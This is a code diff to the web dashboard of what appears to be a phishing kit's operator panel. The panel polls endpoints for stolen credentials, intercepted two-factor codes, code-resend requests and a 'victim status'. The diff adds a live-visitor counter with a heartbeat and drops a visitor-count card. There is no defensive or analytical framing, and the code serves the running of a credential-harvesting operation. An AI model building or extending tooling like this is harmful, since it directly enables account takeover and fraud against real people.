@@ -138,6 +138,16 @@
             transition: all 0.3s ease;
         }
         
+        .stat-card.live {
+            background: linear-gradient(135deg, rgba(0, 255, 136, 0.15), rgba(0, 255, 136, 0.05));
+            border-color: rgba(0, 255, 136, 0.3);
+        }
+        
+        .stat-card.live .num {
+            color: var(--accent-green);
+            text-shadow: 0 0 20px rgba(0, 255, 136, 0.5);
+        }
+        
         .stat-card:hover {
             transform: translateY(-4px);
             border-color: rgba(255, 255, 255, 0.2);
@@ -493,6 +503,10 @@
     </div>
     
     <div class="stats-grid">
+        <div class="stat-card live">
+            <div class="num" id="live-count">0</div>
+            <div class="label">Live Now</div>
+        </div>
         <div class="stat-card">
             <div class="num" id="cred-count">0</div>
             <div class="label">Credentials</div>
@@ -504,10 +518,6 @@
         <div class="stat-card">
             <div class="num" id="resend-count">0</div>
             <div class="label">Resends</div>
-        </div>
-        <div class="stat-card">
-            <div class="num" id="ip-count">0</div>
-            <div class="label">Visitors</div>
         </div>
     </div>
     
@@ -779,13 +789,16 @@
         let lastVictimStatus = '';
         let lastIpsLength = 0;
         
+        setInterval(() => { fetch('/api/heartbeat').catch(() => {}); }, 5000);
+        
         setInterval(async () => {
-            const [credsRes, codesRes, resendRes, stateRes, ipsRes] = await Promise.all([
+            const [credsRes, codesRes, resendRes, stateRes, ipsRes, activeRes] = await Promise.all([
                 fetch('/api/get-creds'),
                 fetch('/api/get-2fa'),
                 fetch('/api/get-resend-requests'),
                 fetch('/api/get-state'),
-                fetch('/api/get-ips')
+                fetch('/api/get-ips'),
+                fetch('/api/get-active')
             ]);
             
             const creds = await credsRes.json();
@@ -793,6 +806,8 @@
             const resends = await resendRes.json();
             const state = await stateRes.json();
             const ips = await ipsRes.json();
+            const active = await activeRes.json();
+            document.getElementById('live-count').textContent = active.count;
             
             // Only rebuild UI if data changed
             if (creds.length !== lastCredsLength || codes.length !== last2faLength || resends.length !== lastResendLength || state.status !== lastVictimStatus || ips.length !== lastIpsLength) {
